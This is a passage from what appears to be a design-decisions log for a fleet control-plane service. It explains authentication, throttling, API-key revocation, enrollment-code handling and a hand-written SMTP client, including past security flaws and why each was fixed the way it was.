### Q1.200 — Why is the JWS in `token.ts` hand-rolled rather than taken from `jose`?

**Decision.** `token.ts` implements compact JWS over Ed25519 on `node:crypto`, by
hand.

**Why.** `jose` is in the lockfile and is unimportable — it is a transitive
dependency of `@agentclientprotocol/*`, and pnpm's strict layout means `src/`
cannot resolve it. The dependency being *present* is what makes this worth
writing down: the lockfile says the library is there and it is not reachable from
the code that would use it.

**Status.** Current

### Q1.201 — Should a token rejected for time say how far out the clock is?

**Decision.** Yes, in both directions and deliberately. `reportSkew` logs a
rejection that falls inside `SKEW_DIAGNOSTIC_LIMIT_MS` — 5× `AUTH_LEEWAY_MS` —
and the verifier returns `detail: {skewMs, daemonTime, leewayMs}` with the
refusal. `/health` carries `time` unauthenticated.

**Why.** A token rejected within 5× the leeway is far more likely to be a wrong
clock than an attack, and silent skew is the classic failure in this shape of
system: every signature is intact, every claim is right, and nothing anywhere
says the two machines disagree about what time it is. Reporting it costs an
attacker who already holds a token nothing they could not measure by trying
again.

**Status.** Current

### Q1.202 — What does a malformed `Authorization` header do?

**Rule.** It is a failure, not a fallthrough. `bearerToken` tells a malformed
header from an absent one, and a header that does not start with exactly
`Bearer ` must not fall through to the `?token=` path.

**Why.** It used to fall through whenever the header did not match exactly, so
`authorization: bearer x` — a credential that was present, sent, and one
capitalisation wrong — was reported as a *missing* token. The caller is then
debugging the wrong half of the request.

**Status.** Current

### Q1.203 — Why is `enroll`'s timeout cleared after the body is read rather than before?

**Rule.** `enroll` must not swallow an abort while reading the body: the timeout
is cleared *after* `response.json()`, and there is no blanket `.catch(() => null)`
on that path.

**Why.** `fetch` resolves as soon as headers arrive, so a control plane that
sends a status line and then stops talking is still inside the request when the
promise has already settled. Clearing the timer at that point leaves the body
read unbounded, and a blanket catch around it turned the abort into a parse
failure: a control plane that simply stopped talking reported `bad_response`,
which names the wrong fault and points enrollment debugging at the payload.

**Status.** Current

### Q1.204 — Is redeeming an enrollment code safe against a machine that is already up?

**Behaviour.** No. Redeeming a code retires the machine's tunnel key
(`issueTunnelKey` mints the replacement in the same call), so enrollment is
destructive to any live tunnel for that machine.

**Why.** It is a trap in a driver above all — a check that enrolls against a
machine somebody is using takes that machine off the network for the length of
the run. `relaycheck` redeems against its own machine for exactly this reason,
and any new driver touching `/v1/enroll` owes the same discipline.

**Status.** Current

### Q1.300 — Why does `cpctl admin settings` refuse a value on the command line for a secret?

**Decision.** A key in `SECRET_SETTING_KEYS` takes **no** `<v>`. It is prompted for
with echo off, or read as one line off stdin when there is no tty, so it stays
scriptable: `… settings smtp.password < secret-file`.

**Why.** argv is in `ps` for every process on the host and in shell history — on the
box holding the fleet signing key. The refused set is `SECRET_SETTING_KEYS`,
imported rather than transcribed, so a second secret is covered by arriving: USAGE,
the refusal and the prompt all read the same list.

**Status.** Current

### Q1.301 — Can an admin obtain a credential for somebody else's account?

**Decision.** Not through a route in this service — `db.prepare("INSERT INTO
api_keys` appears in `app.ts` exactly once, and not on a route reading
`c.req.param("id")`, which `relaycheck` asserts by reading the source. There is no
`cpctl admin passwd` and no `cpctl admin key`. But an admin **can** take an account
over by another door, and the honest form of the answer is the route table rather
than a slogan.

**Why.** An admin owns `smtp.host`, so they can point mail at a host they control
and drive `POST /v1/forgot` for anybody with a confirmed address. That is not a code
change and not a new power — the same admin can self-promote with `POST
/v1/admin/users {isAdmin: true}`, delete anyone, and reassign every machine's owner.

**Rejected.** The sentence this replaces — "an admin may take a credential away and
may never issue one" — claimed more than deleting the admin password reset bought,
and it still stands in a `schema.sql` comment beside `withKey`. It was wrong in the
way documentation is worst: precise, quotable, and about a boundary that is not
there.

**Status.** Reversed an earlier decision

### Q1.302 — How many settings keys are there?

**Decision.** `SETTING_KEYS.length` is the number, and `relaycheck` reads it rather
than a literal. The count is deliberately not written into prose anywhere.

**Why.** It was "thirteen" in the prose and in two docblocks, and adding
`machines.per_user` made all three wrong at once. A count transcribed into prose is
a count that drifts.

**Status.** Current

### Q1.303 — Why can the browser no longer sign in with an API key?

**Decision.** `SignIn` has no API-key field; that field and `useApiKey` are deleted.
The browser asks for a password, and an account holding only a key reaches the app
through `cpctl passwd` — which sets the first password an account with no
`user_passwords` row needs no current password to set.

**Why.** API keys survive as the credential for everything that is not a browser —
`cpctl`, a script, and getting back in when this service has been rolled back — and
both are full authority, `callerAuth` resolving either by its three-character
prefix. What the field bought was a second door onto the one screen that already has
the right one. A key already in `localStorage` is still adopted, so an open tab is
not signed out by the change.

**Status.** Current

### Q1.304 — Why could an API key never be taken back?

**Decision.** Two routes write `api_keys.revoked_at`, both deliberate revocations:
`DELETE /v1/me/keys/:keyId` and `DELETE /v1/admin/users/:id/keys/:keyId`, through
`revokeApiKey`.

**Why.** The column was read by `callerAuth` and written by nothing, so the one
credential here that never expires was also the one nothing could take back — a
property the code appeared to have from both ends, the schema carrying the column
and the middleware honouring it. The third writer this used to name was the sweep
inside the admin password reset, and that route is deleted: an admin can no longer
end somebody's key by resetting their password, because an admin can no longer reset
their password.

**Rejected.** Retiring keys on a self-service password change. `POST
/v1/me/password` revokes sessions and leaves keys alone, deliberately — a key is a
separate credential with a separate lifecycle and `cpctl` is holding one. Two routes
list them through `apiKeyRows`, which returns the prefix and never the key or the
hash, and `GET /v1/admin/users` counts the unrevoked ones so an admin can see that a
key exists at all.

**Status.** Current

### Q1.305 — What is the login throttle keyed on?

**Decision.** A composed key from an exported pure builder and nothing else:
`loginKey` is `<name, address>`, `addressKey` is the per-address backstop under the
looser `ADDRESS_THROTTLE`, and `passwordChangeKey` is namespaced on the *user id*.

**Why.** Keyed on the bare name it was a lockout weapon: eleven unauthenticated
`POST /v1/login` requests locked somebody out of their own sign-in **with the
correct password**, and out of their own password change on a valid session, with no
credential and no knowledge of anything but the name. Namespacing the password-change
counter on the user id is what stops anything an anonymous caller records reaching an
authenticated route. What bounds a many-address sprayer is not this file but
`password.ts`'s public lane.

**Status.** Current

### Q1.306 — Which `x-forwarded-for` entry is the caller's address?

**Decision.** As many entries from the **right** as `REEMOAT_CP_TRUSTED_PROXY_HOPS`
says are yours, and the header is ignored outright at the default of **0**. A header
carrying fewer entries than hops did not come through the chain the operator
described, so the socket answers instead.

**Why.** `callerAddressOf` took the **first** entry and preferred it to the socket,
with no trusted-proxy option anywhere, so the address in every throttle key was a
string the caller typed. Rotating it defeated `loginKey` and `addressKey` together,
and spelling somebody *else's* address into it aimed them: thirty failed sign-ins
refused that address its own sign-in **and** its own `POST /v1/forgot` for fifteen
minutes, with no credential and no name known. Counting from the right is the only
honest direction, because that is the end a proxy appends to — with one hop the last
entry is what your proxy observed and the leftmost is whatever the client sent.

**Why the default is 0 even though it is wrong for the recommended shape.** Loopback
publish behind TLS puts every caller in one bucket at zero hops, so the
`install.sh` wizard asks, and `main.ts` warns once at runtime when the header
arrives while it is being ignored. A default that trusts a proxy nobody configured
is the failure that cannot be noticed.

**Rejected.** Leaving it as it was on the strength of `net.ts`'s own docblock, which
said both callers "only ever *print* the answer" and "nothing authorizes on it" —
while `throttle.ts` read the same value, and a `429` is a refusal. That comment is
what kept the defect unexamined.

**Status.** Current

### Q1.307 — What happens to a deleted person's machines?

**Decision.** `DELETE /v1/admin/users/:id` **revokes** them, reporting
`machinesRevoked`, in the same transaction that removes every credential
authenticating as them — password, keys, sessions and their origins, grants, and
every unredeemed enrollment code they minted through `burnUserCodes` with `used_from
= 'user_deleted'`. Deleting *yourself* is refused.

**Why.** The earlier decision left those machines registered and ownerless, on the
ground that deleting a person should not take a daemon somebody may still be running
off the network. What that missed is what ownerless *became*: no owner means no
machine limit and no ban check, both being facts about the owner, so a delete was the
one act that manufactured a live machine no rule applied to. The old argument's true
half survives as the price — a running daemon does go dark, and getting it back means
enrolling on that host again — and it is the right trade only because the person is
gone, which is exactly why `disable` does not do it.

**Why `enrollment_codes.created_by` is left dangling.** `schema.sql` used to say rows
in `users` are never deleted, and what that sentence protected is now written down
rather than enforced: an audit row's job is to say what happened, so a code may name
a user who is gone. Refusing to delete yourself is also what makes "there is always
an enabled admin left" true by construction.

**Status.** Reversed an earlier decision

### Q1.308 — Does banning somebody reach the enrollment codes they minted?

**Decision.** Yes. `disable` calls `burnUserCodes(db, userId, "user_disabled", now)`
beside `revokeAllSessions` and reports `enrollmentCodesInvalidated`. `enable` does
not give them back.

**Why.** Every other credential that authenticates as a disabled person is refused by
`callerAuth`, which reads `disabled_at` live — but `POST /v1/enroll` sits above THE
LINE, has no caller at all, and its claim asks only whether the code is unused and
unexpired. So the one sentence the delete route's code burn exists for was reachable
through the *reversible* remedy: a banned account redeems a code it minted minutes
earlier and `issueTunnelKey` retires the running daemon's tunnel key in the same
call. A mistaken disable therefore costs one live code — 1 hour, and minting another
is one request — which is the same trade `enable` already makes about sessions.

**Why the reason is an argument rather than a literal.** `UserCodeBurnReason` is
**required** at the call site, so `user_deleted` and `user_disabled` stay apart in
the only forensic column there is, and the wrong reason is not the easy one to write.

**Status.** Current

### Q1.309 — How does an invited account whose link never arrived get in?

**Decision.** `POST /v1/admin/users/:id/invite` re-mints and re-sends, and **it
issues nothing to the caller** — no token, no password; the link goes to the address
on the account. It is `cpctl admin invite`, and Settings → Users draws it on exactly
the rows in that state.

**Why.** An invited account was the one state this service could not get itself out
of. It holds no password and an address that is deliberately **unverified** —
clicking the link is what proves it — so `POST /v1/forgot` mails nothing, because
`verifiedOwnerOf` is what it looks an address up by. An invitation that was never
delivered (a full outbox, a permanent 5xx, SMTP broken that minute) or simply not
opened inside 48 hours shut every door at once: no sign-in, no recovery, `409
user_exists` on creating them again, and the admin reset that used to be the way out
deleted by the same change. Issuing nothing to the caller is what keeps this from
reopening what deleting that reset closed.

**Status.** Current

### Q1.310 — Does holding an API key let you change the account's password?

**Decision.** No. `POST /v1/me/password` requires the current password whenever there
is one, whichever credential is presenting, and it always did. A forgotten password
is recovered by `POST /v1/forgot` and by nothing else, and that needs an address the
account has **confirmed**.

**Why.** An unverified claim on an address reserves nothing. Four separate places in
the documentation said an API key was a way back in; those sentences were wrong about
code that had never behaved that way, and are corrected rather than left standing.

**Status.** Current

### Q1.311 — Why does `cpctl admin relay` say how long a machine has been offline?

**Decision.** `machine_last_seen` is written by the relay on the flush it already
runs, and `GET /v1/admin/relay` reports it.

**Why.** Presence is *deleted* on disconnect, so "offline a minute" and "offline a
week" were one answer everywhere — the row simply was not there, and nothing
distinguished a daemon that had just been redeployed from one that had been gone
since a laptop was last opened. Riding the existing flush is what keeps it off the
request path.

**Status.** Current

### Q1.312 — Why did a sign-in screen with an unknown instance config draw no links at all?

**Decision.** The fail-open is `showsGateLink`, which is `!== "closed"`, and
`gateNotice` goes through it too — the property being that the notice is `null`
**iff** both links are drawn. `gateOffer` is not the predicate anybody calls;
`SignIn` calls it **nowhere**, and `webcheck` reads that file off disk to assert it.

**Why.** `gateOffer` answers three ways — `link`, `closed`, `unknown` — and every
caller wants two. That gap is where the design was lost once: the fail-open was
*asserted* on `"unknown"` and then thrown away by call sites testing `=== "link"`, so
an unknown config drew nothing, in the one frame somebody arriving at a sign-in
screen actually looks at. Re-deriving a two-way answer at a call site is the exact
defect the extracted predicate exists to end.

**Why it fails open where `visibleSections` fails closed.** Fail closed where the
cost is a missing screen; fail open where the cost is a locked-out person.

**Status.** Current

### Q1.400 — Why is the control plane's auth gate positional rather than a list of paths?

**Rule.** One `app.use("/v1/*", callerAuth(db))`, registered after the public set. The
public routes are "the ones above the line" and nothing enumerates them anywhere else;
a new private route is protected by doing nothing at all.

**Why.** Auth used to be four *exact*-path `app.use` lines, which meant
`POST /v1/machines/:id/enrollments` — minting a full machine identity — served with **no
credential at all**. A list of exact paths fails open for every route added after it; a
positional gate fails closed. The mechanism has been exercised since, because mail more
than doubled the public set: it went from four routes to ten, and every one after the
fourth was added *above* the line on purpose.

**Consequence for bodies.** The `app.use("/v1/*")` that raises the body limit to 256 KiB
is registered below the gate, so it never reaches a public route — which is why the seven
public routes taking a body carry `PUBLIC_BODY_LIMIT_BYTES` themselves. Above the line is
exactly where somebody with no credential decides how many bytes are read.

**Status.** Current

### Q1.401 — Does a login answer faster for a name nobody has?

**Rule.** No. Every branch — unknown name, a user with no `user_passwords` row, and a
disabled account — verifies against a decoy hash and takes the same concurrency slot as a
real verification.

**Why.** Without it the route answers in microseconds for a name nobody has and in ~50ms
for one somebody does, which is a user-enumeration oracle measurable over the network by
anybody, with no credential.

**Measured.** Over real HTTP: **50.9ms** for an unknown name against **52.3ms** for a
real one.

**Status.** Current

### Q1.402 — Can a stolen session take an account over through the email route?

**Rule.** `PUT /v1/me/email` proves the current password **unconditionally**, whether or
not the account holds a verified address.

**Why.** It asked only about a *verified* address, so with no `user_emails` row or an
unverified one a stolen session ran the whole chain: repoint the address (no proof
asked), confirm it with the same session, `POST /v1/forgot`, `POST /v1/reset` — out comes
a password the thief chose, every other session revoked, and a fresh one for them.
`main.ts`'s bootstrap admin holds no `user_emails` row at all, so the fleet's founding
account was in exactly that state — and the `email_changed` notice to the old address
carried the same condition, so nobody was told.

**The exemption was a category error.** It read "there is nothing to steal yet": true of
the *address*, false of the account the route hands over.

**Why the migration exception cannot be reached this way.** Every `mintSession` call site
requires or creates a `user_passwords` row, so only an API key reaches the no-password
branch, and a key is already full authority.

**Client half.** `emailChangeNeedsProof` in `packages/web/src/account.ts` carries the
same rule; changing one side without the other is a `400` on screen.

**Status.** Current

### Q1.403 — Should an admin be able to reset somebody's password?

**Decision.** No. The two admin routes that were a password change by another door are
**deleted** rather than guarded, so an admin cannot enter anybody's account at all.

**Why deletion is the stronger fix.** The invariant is that a password change requires
the current password even under a valid session — otherwise a session token lifted from a
tab converts into permanent ownership of the account in one request, the one thing that
gets worse under sessions than under a key. Guarding the admin routes would have left two
more doors to keep guarded; deleting them leaves three routes, all `/v1/me/*`.

**What went with them.** The key sweep those routes carried (an admin ending somebody's
API keys by resetting their password) is gone and nothing replaced it: revoking a key is
its own act. So is the open question of whether an admin reset should burn enrollment
codes — there is no admin reset to ask it about.

**The way back in** for an account holding only a key is `cpctl passwd`, which sets the
first password an account with no `user_passwords` row needs no current password to set.

**Status.** Reversed an earlier decision

### Q1.404 — Can somebody lock me out of my own account by guessing at my name?

**Rule.** A guessing counter is keyed on a **composed, namespaced** key built by an
exported pure builder — `loginKey(name, address)` and the ten beside it — and never on a
name alone.

**Why.** Keyed on the bare name this was a lockout weapon: eleven unauthenticated
`POST /v1/login` requests refused somebody their own sign-in *with the correct password*
and their own password change on a valid session, for about eleven requests every fifteen
minutes, from anywhere, with no credential.

**Why every builder is namespaced.** The address half is caller-supplied. With a bare
`<name>|<address>` spelling, a login naming `pwchg` and forwarding a user id writes
exactly the key a password change reads — so an anonymous caller could write into an
authenticated route's counter.

**Why the list is the count.** A numeral in the prose said "ten" the day the eleventh
builder arrived, which is `SETTING_KEYS`' lesson in another file.

**Status.** Current

### Q1.405 — Why is a failed login recorded before the password is even verified?

**Rule.** `check` is synchronous and `fail` runs **before** the `await`, with `succeed`
un-recording the attempt as soon as the password verifies — deliberately before the
disabled check.

**Why.** With `fail` after `await verifyPassword`, every guess arriving inside one KDF
window saw a counter nothing had incremented yet. The throttle was measuring the
semaphore rather than the guesses.

**Measured.** **40 concurrent guesses reached 36 real verifications against a threshold
of 5.**

**Status.** Current

### Q1.406 — What does a synchronous scrypt cost the control plane?

**Rule.** `scryptSync` is never called on a live path. The one exception is the decoy
hash, built at module load before any listener exists.

**Why.** That process carries the API listener, every relay tunnel and `serveStatic`.

**Measured.** The synchronous form blocks the event loop **25ms per attempt**, so ten
logins a second is a fleet-wide outage reachable by anyone who can POST.

**Status.** Current

### Q1.407 — Can a login spray deny everybody else a password hash?

**Rule.** A hash names which side of the credential gate it is for and `HashLane` has no
default: 4 concurrent hashes, of which at most 2 may be `"public"`, per-lane wait lists
(32 authenticated, 16 public), and `release` wakes an authenticated waiter first,
unconditionally.

**Why.** One gate of four was a starvation weapon. The login route reaches the KDF on
*every* request by design, so a spray of distinct names is a spray of real hashes and no
per-identity threshold ever sees it.

**Measured.** 36 hashes in flight, and every login *and* every admin password reset
answered `503 overloaded` — the remedy denied by the attack.

**Why a fair queue is not the answer.** Under a spray, a fair queue is always the
sprayer's. Hence the unconditional preference for an authenticated waiter.

**Known residue.** `POST /v1/reset` takes `"public"`, because the lane is about which side
of THE LINE the route sits on and not about how the caller feels — so a login spray can
still queue a mailed recovery behind it. Bounded rather than closed: the public lane's
wait list is 16 and answers `503 overloaded` with `Retry-After: 1` rather than hanging.

**Status.** Known limitation

### Q1.408 — Could an API key ever be taken back?

**Rule.** One `UPDATE api_keys` statement, reached by two routes: `revokeApiKey` behind
`DELETE /v1/me/keys/:keyId` and `DELETE /v1/admin/users/:id/keys/:keyId`.

**Why.** `api_keys.revoked_at` was read by `callerAuth`, which answered `api_key_revoked`
— so the capability looked present from both ends, the schema having the column and the
middleware honouring it — while there was **no `UPDATE api_keys` anywhere in this
service**: three INSERTs, one SELECT, and a DELETE inside user deletion. A key was
immortal until the account holding it was deleted outright, which on the single-admin
deployment `install.sh` creates means a leaked admin key had no in-band remedy at all.

**The general shape.** A credential the code can read is a credential something must be
able to write. It is the same failure `sessionOf` is named for: a property the code
appears to have and nothing enforces is worse than one it visibly lacks.

**What is deliberately not done.** No password change on this service retires a key. The
route that existed for "somebody else may have this account" no longer exists (Q1.403),
and a self-service change revokes sessions only — a key is a separate credential with a
separate lifecycle and `cpctl` is holding one.

**Status.** Current

### Q1.409 — Can an account that has just been deleted or banned still enroll a daemon?

**Rule.** `burnUserCodes` runs inside the delete's existing `BEGIN`/`COMMIT`, and
`POST /v1/admin/users/:id/disable` burns them too, recording `'user_deleted'` or
`'user_disabled'` in `used_from` through a **required** `UserCodeBurnReason` argument.

**Why.** `DELETE /v1/admin/users/:id` swept sessions, origins, passwords, keys, grants and
ownership and **not** `enrollment_codes` — so a just-deleted account could redeem a code
it was still holding at `/v1/enroll`, which sits above THE LINE and asks only whether the
code is unused and unexpired, receive the machine id and the fleet's public keys, and have
`issueTunnelKey` retire the **legitimate daemon's** tunnel key in the same call.

**Why the reversible remedy needed it too.** The invariant is about the code, not about
the route, and scoping it to `delete` was the hole: `/v1/enroll` reads neither
`created_by` nor `users.disabled_at`, so the same sentence was reachable through
`disable`. A mistaken disable now costs one live code — 1 hour, and minting another is one
request — which is the same trade `enable` already makes about sessions.

**Why the reason is an argument rather than a literal.** `user_deleted` and
`user_disabled` are different events, and `used_from` is the only forensic trail there is.

**What is deliberately left alone.** `created_by` may name a user who is gone, dangling on
purpose, because an audit row's job is to say what happened. And `POST /v1/reset` burns
sibling email tokens and revokes sessions but leaves enrollment codes alone: somebody
proving control of their own address is not evidence that a daemon they enrolled is
compromised.

**Status.** Current

### Q1.410 — What did revoking a machine leave behind?

**Rule.** `releaseOwner` drops the `machine_owners` row inside the same transaction as the
`UPDATE` and the code burn, on **both** revoke routes, with no `return` between `BEGIN`
and `COMMIT`.

**Why.** `machine_owners` has no `revoked_at` and its unique index on `(user_id, label)`
does not join `machines`, so a revoked machine held its label and one of
`MAX_MACHINES_PER_USER` for ever. Revoke `laptop`, create `laptop`, and the answer is a
`409` naming a machine that appears in no list and can never be reached — and after fifty
revocations the account cannot add a machine at all, with nothing on screen to explain it.

**The inverse had to exist for the same reason.** `INSERT INTO machine_owners` happened
only inside `createOwnedMachine`, which always mints a fresh id, so ownerless was a
one-way state and a person leaving the fleet stranded their hardware: rename, re-enroll and
revoke all resolve through `ownerOf` and answer 404 for the life of the row.
`PUT /v1/admin/machines/:id/owner` writes the grant *with* the ownership row, because an
owner with no grant owns a machine that appears in no list.

**Status.** Current

### Q1.411 — Should a `403` from an admin route sign somebody out?

**Rule.** `authFailure` decides on the error **code**, never the status. `403 forbidden`
returns `null`, and so does `401 invalid_password`.

**Why.** Under the old `status === 401 || status === 403` test, `requireAdmin` answers 403
to every non-admin — so merely opening the Users section would have signed a non-admin out
of the whole app. The mirror case is `401 invalid_password`, a 401 about the request
*body* rather than about the credential that carried it, reachable from three routes
(`/v1/me/password`, `/v1/me/keys`, `PUT /v1/me/email`): mistyping your own password on the
screen that fixes a suspected leak must not be what ends the tab.

**Status.** Current

### Q1.412 — Can a 401 about an expired token sign out the session that replaced it?

**Rule.** `cpFetch` captures `const sent = credential` before building the header and
tears down only while `credential === sent`. `setSession` always allocates, so identity is
the whole comparison.

**Why.** `CP_TIMEOUT_MS` is ten seconds, which is ample for a request carrying an expired
token to answer *after* a wake has signed out, a fresh sign-in has succeeded and
`bootstrap` has rebuilt the fleet. The stale 401 then cleared the brand-new token from
memory and `localStorage` and returned the tab to the gate — about a session that was
perfectly good and which, no `DELETE /v1/me/sessions/current` having been sent, then
lingered for its full thirty days.

**Status.** Current

### Q1.413 — Why does an account that is signed in need a write throttle at all?

**Decision.** 60 writes per minute per `<user, route>`, then a flat 10s —
`writeKey(userId, what)`, namespaced, with `what` a fixed literal per route so hammering
one cannot lock the other.

**Why.** Below THE LINE there were three middlewares and no counter, so an ordinary
account could drive `POST /v1/tokens` (a signature) and
`POST /v1/machines/:id/enrollments` (a transaction under `synchronous = FULL`, into a
table with no sweeper) as fast as it could ask — on the process that in embedded mode
holds every tunnel in the fleet.

**Why it is generous and non-escalating.** Every other policy here bounds guessing; this
one bounds cost, and the likely caller is a retry loop rather than an attacker.

**Status.** Current

### Q1.500 — Why does registering a machine grant it and mint its code in one request?

**Decision.** `POST /v1/machines` does all three at once: it registers the
machine, grants it to its creator with every scope, and mints its enrollment
code.

**Why.** Those were three separate administrative acts, and the third was
routinely forgotten. A machine registered and enrolled but never granted appears
in nobody's list — the daemon comes up, holds a tunnel and is reachable by
nobody, with nothing anywhere reporting that a step was skipped.

**The label rule rides the same route.** A label may not be spelled like a
machine id (`MACHINE_LABEL_RESERVED`), because `MACHINE_LABEL` admits that exact
shape and `POST /v1/tokens` would then mint a token for the wrong `aud` with
nothing on either side reporting it. `labelIsWellFormed` is the one call that
tests both, so nothing can check one rule and forget the other.

**Status.** Current

### Q1.501 — Can a grant put two machines with the same name in one list?

**Position.** Yes, and it is knowingly left open. `PUT /v1/admin/grants` is a
sixth path that reaches the same state as the five `nameVisibleTo` guards
(Q1.48), without naming anything: a grant hands somebody a machine that is
already called something, so the collision arrives with no write to a label or a
name and no check on the way.

**Why it is not refused.** Refusing would refuse an admin a share over a
collision only the grantee can see, on the one route `cpctl admin grant` drives
and the only remaining way to share a machine at all. What it costs is
reachability rather than authority: `POST /v1/tokens` still checks the grant
after resolving, so the worst outcome is that `resolveMachineRef` picks one of
the two by name and the other must be addressed by id.

**Why it is written down.** Four guarded routes in a row read as coverage. The
gap is in the fifth thing somebody would assume was covered.

**Status.** Known limitation

### Q1.502 — How many routes enforce the machine limit?

**Rule.** The number is deliberately not written in prose anywhere. The list is.

**Why.** It said "four" in the same sentence that named six routes, while the
code had eight. That is the failure `SETTING_KEYS` records one section over: a
numeral in prose is a second copy of a fact the code already holds, and it goes
wrong silently and stays wrong.

**What is written instead.** `POST /v1/machines`, `POST /v1/provision`, `POST
/v1/admin/machines` and `PUT /v1/admin/machines/:id/owner` refuse a *creation*
with `409 machine_limit`; `POST /v1/machines/:id/enrollments`, `POST /v1/tokens`,
`relay/authorize.ts` and `relay/tunnel-endpoint.ts` refuse an *existing*
over-limit machine with `403 machine_over_limit`.

**Status.** Current

### Q1.503 — In what order does `POST /v1/provision` create the machine and raise the limit?

**Rule.** The machine first, and the limit only once it exists — so a refused
provision changes nothing. `machineLimitRaisedTo` only rides the 201.

**Why.** The write came first and neither refusal undid it, so a *failed*
provision widened somebody's quota for ever. The ceiling arm is what made that
serious rather than untidy: at fifty machines under a lowered limit, `min(51,
50)` was written and the create was then refused — a 409 that created nothing had
un-suspended forty-five machines an admin had deliberately switched off, reported
nowhere, since the raise is only ever announced on the success.

**Status.** Current

### Q1.504 — Which account does provisioning mean when two names differ only by case?

**Rule.** Neither. The name is resolved to exactly one account or the request is
refused with `409 user_ambiguous`.

**Why.** `users.name` is UNIQUE and compared BINARY while `idx_users_name_folded`
is a plain index, so `Casey` and `casey` can both exist. Resolved with `.get()`,
whichever row SQLite happened to yield first decided who got the machine, who got
the `ALL_SCOPES` grant, whose limit was raised, and whose `disabled_at` the ban
check read — four decisions about a person, taken by row order.

**Status.** Current

### Q1.600 — Why is the SMTP client hand-rolled rather than a library?

**Decision.** `packages/control-plane/src/mail/smtp.ts` implements SMTP itself,
and `sendMessage` takes an `SmtpDialer` rather than opening a socket — the shape
`AcpClient` already takes `AgentProcess` in.

**Why.** The seam is what lets `relaycheck` prove, with no mail server anywhere,
three things a library would only assert by having been imported: that STARTTLS
is never silently downgraded — and that no `AUTH` and no `MAIL FROM` were written
when it refuses — that the second `EHLO` wins, servers routinely advertising
`AUTH` only after TLS, and that a `QUIT` failing after `250` is not a send
failure, which is the one place a careful implementation sends the message twice.

**Rejected.** A library. It puts all three properties out of reach of an offline
driver, on the one outbound path this service has.

**Status.** Current

### Q1.601 — Why does even the admin's own test send go through the queue?

**Decision.** Nothing is ever sent from a request: `POST /v1/forgot` enqueues and
returns, and so does the admin's test send.

**Why.** The test send is the one route where somebody would happily hold the
socket, which is exactly what makes it the worst place to allow it — that socket
is held in the process carrying the API listener, `serveStatic` and every relay
tunnel, and a dial that never answers is a libuv threadpool slot (Q1.603).
Beyond the loop, this is also what keeps a taken address and a fresh one
indistinguishable: an inline send would make the two branches measurably
different in time, and the identical response body would stop meaning anything.

**Status.** Current

### Q1.602 — Why base64 rather than quoted-printable?

**Decision.** Both MIME parts are base64.

**Why.** Base64 is 7-bit clean, so `8BITMIME` never needs negotiating, and its
alphabet excludes `.`, so no body line can begin with one.

**Rejected.** Quoted-printable, the smaller encoding for mostly-ASCII text. It
has three independently-easy-to-get-wrong rules whose failures land *per
recipient* and are invisible from here.

**Status.** Current

### Q1.603 — How can a mail outage become a sign-in outage?

**Behaviour.** `net.connect(host)` resolves names with `dns.lookup()`, which is
`getaddrinfo` on the libuv threadpool — the same pool `scrypt` runs on and
`serveStatic` draws from. A hung DNS server, or an MX that accepts the connection
and never answers, consumes slots until password hashing queues behind it and the
sign-in page stops loading.

**Why.** It is the coupling nothing in the code names, so every bound on the mail
path exists to stop it: one message at a time fleet-wide, hard per-step budgets
(10 s to connect, 30 s for the body, 60 s for the final dot), 90 s wall-clock for
a whole message, and a breaker that stops dialling after five consecutive
failures.

**Status.** Current

### Q1.604 — Why does `sniFor` return `undefined` for an IP address?

**Rule.** No SNI is sent when `isIP(host) !== 0`, on both TLS paths — implicit
TLS at `connect` and the `startTls` upgrade.

**Why.** An IP is a thing operators really type: a docker gateway, an internal
MTA, `172.17.0.1` from inside the container `compose.sh` runs. Passed through,
**every** message on such a host failed for ever, doubly disguised — the throw is
not an `SmtpError`, so `sendMessage`'s wrapper filed a connection that died at
the upgrade under step `body`, and `permanent` is false, so each message spent
all eight attempts before giving up. On an instance where mail is the only
account recovery there is, that is silent and total. Omitting it is also what the
RFCs want — SNI carries a *name*, and there is no name to send when the operator
addressed a number — and it costs no verification: with `rejectUnauthorized` on,
an IP is still checked against the certificate's IP SANs. No driver asserts it:
`sniFor` is module-private and the failure is inside `tls.connect`, which the
`SmtpDialer` seam exists to keep out of `relaycheck`.

**Measured.** Node v26.3.0: `tls.connect` throws *"Setting the TLS ServerName to
an IP address is not permitted"* before a byte moves.

**Status.** Current

### Q1.605 — Why is `handshake` a step budget of its own rather than part of `starttls`?

**Rule.** The eight per-step budgets are connect, greeting, EHLO, STARTTLS,
handshake, AUTH, envelope and DATA, 10 s each.

**Why.** Handshake is the one step with no `read` behind it. Every other budget
is enforced by `ReplyReader` asking for bytes, and `total` is only re-checked *at*
a read — so a stalled TLS negotiation is a step no other ceiling can see.

**Status.** Current

### Q1.606 — Why is there no `POST /v1/register/resend`?

**Decision.** It was deleted, and signing up again took its job — which is why
the per-address budget it used to hold is not a third share. `mayMail` is spent
by `POST /v1/register`, on all three of its arms, and by `PUT /v1/me/email`: two
routes, so they cannot compose into six.

**Why.** The re-signup *is* the resend, and a separate route with its own budget
would have made the same act cost less by being spelled differently.

**Status.** Reversed an earlier decision

### Q1.607 — Why does reset mail have its own hourly budget?

**Rule.** `RESET_MAIL_THROTTLE`, 3 an hour per address, with no escalation, kept
apart from the `mayMail` budget.

**Why.** Shared, anybody who knew an address could spend the recovery that
address depends on and hold it spent.

**Status.** Current

### Q1.608 — Why is the default SMTP port 587 and never 25?

**Decision.** The default port is 587.

**Why.** Outbound 25 is blocked by every major cloud, and a blocked port hangs
rather than refuses — so the visible failure is a per-step budget expiring rather
than an error anybody can read.

**Status.** Current

### Q1.609 — Why do the three mailed-link lifetimes differ?

**Decision.** Verify 24h, reset 1h, invite 48h.

**Why.** Reset is the one token that takes an account over, and the person is at
the screen while it is live. Nobody is waiting on an invitation, and
`POST /v1/admin/users/:id/invite` re-sends past 48h, which is what stops that
number being a deadline on somebody's whole account.

**Status.** Current

### Q1.100 — How is one tunnel's stream budget divided between the people who hold a grant on the machine?

**Decision.** By the verified `sub`, at `MAX_STREAMS_PER_SUBJECT` — 64 concurrent
streams per caller on one tunnel, under `MAX_CONCURRENT_STREAMS`' 256 for the
tunnel as a whole. `RelayTunnel.open` in `relay/registry.ts` refuses a caller
already at its share by answering `null`, **before the stream exists**.

**Why.** A grant is full access and the tunnel budget is shared, so without a
per-person share the 256 is a resource anybody holding a grant can take entirely
— and the machine's *owner* is then refused `503 no_tunnel` on their own machine,
which `meansMachineGone` turns into "this machine is not reachable", i.e.
indistinguishable from a daemon that has stopped. A person watching their own
laptop go dark while it is sitting there running is the worst reading available
of a resource limit.

**Nothing here is about malice, which is what sizes it.** The web client holds up
to three sockets per session plus a request in flight, so somebody with several
